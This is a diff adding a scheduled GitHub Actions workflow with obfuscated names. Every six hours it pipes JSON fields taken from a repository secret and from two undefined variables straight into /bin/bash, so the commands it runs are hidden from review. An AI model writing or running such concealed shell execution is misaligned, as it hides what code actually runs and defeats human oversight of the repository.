@@ -1,0 +1,18 @@
+name: xiangyuhuanliu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangyuhuanliu
+        env:
+          t2884: ${{ secrets.t2884 }}
+        run: |
+          echo $t2884 | jq -r .kn3 | /bin/bash
+          echo $tzou355 | jq -r .ullt9 | /bin/bash
+          echo $ltkwk31231 | jq -r .ok97 | /bin/bash
+
